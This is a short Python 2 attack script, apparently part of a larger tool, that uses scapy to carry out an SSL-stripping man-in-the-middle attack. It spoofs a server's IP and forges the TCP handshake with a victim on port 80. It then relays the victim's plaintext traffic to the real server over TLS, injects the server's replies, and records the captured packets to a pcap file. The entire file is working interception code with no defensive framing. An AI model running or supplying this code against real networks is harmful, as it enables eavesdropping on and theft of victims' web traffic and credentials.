from scapy.all import *
from scapy_ssl_tls.ssl_tls import *

tls_version = TLSVersion.TLS_1_2
ciphers = [TLSCipherSuite.ECDHE_RSA_WITH_AES_128_GCM_SHA256]
extensions = [TLSExtension() / TLSExtECPointsFormat(), TLSExtension() / TLSExtSupportedGroups()]

def forward(p, port, ipLayerC, ifa, socket):
    try:
        answer = socket.do_round_trip(TLSPlaintext(data = p.load))
        tcpLayer = TCP(sport = 80, dport = port, seq = p.ack, ack = p.seq + len(p.load), flags = "PA")
        send(ipLayerC / tcpLayer / answer[TLSPlaintext].data, iface = ifa, verbose = False)
        return p.summary() + "\n" + answer.summary()
    except: # The captured packet did not have an HTTP load
        return p.summary()
        
def startforwarding(ipToSpoof, ifa, timeOut, output):
    print "Listening as " + ipToSpoof

    # SYN from client
    a = sniff(count = 1, filter = "tcp and port 80 and dst host " + ipToSpoof, iface = ifa)
    ipVictim = a[0][IP].src
    port = a[0].sport
    print "Connection from " + ipVictim + ":" + str(port)

    # SYNACK to client
    ipLayerC = IP(src = ipToSpoof, dst = ipVictim)
    synAck = TCP(sport = 80, dport = port, flags = "SA", seq = a[0].seq, ack = a[0].seq + 1)
    send(ipLayerC / synAck, iface = ifa)
    print colores.GREEN + "Handshake with client completed" + colores.RESETALL

    with TLSSocket(client = True) as socket:
        # Establish an SSL connection with the server
        socket.connect((ipToSpoof, 443))
        server_hello = socket.do_handshake(tls_version, ciphers, extensions)
        print colores.GREEN + "Handshake with server completed" + colores.RESETALL
        print "---------------------"

        packets = sniff(filter = "tcp and src host " + ipVictim, iface = ifa, timeout = timeOut,
            prn = lambda(p): forward(p, port, ipLayerC, ifa, socket))

        # Save sniffed packets
        if output:
            wrpcap(output, packets)
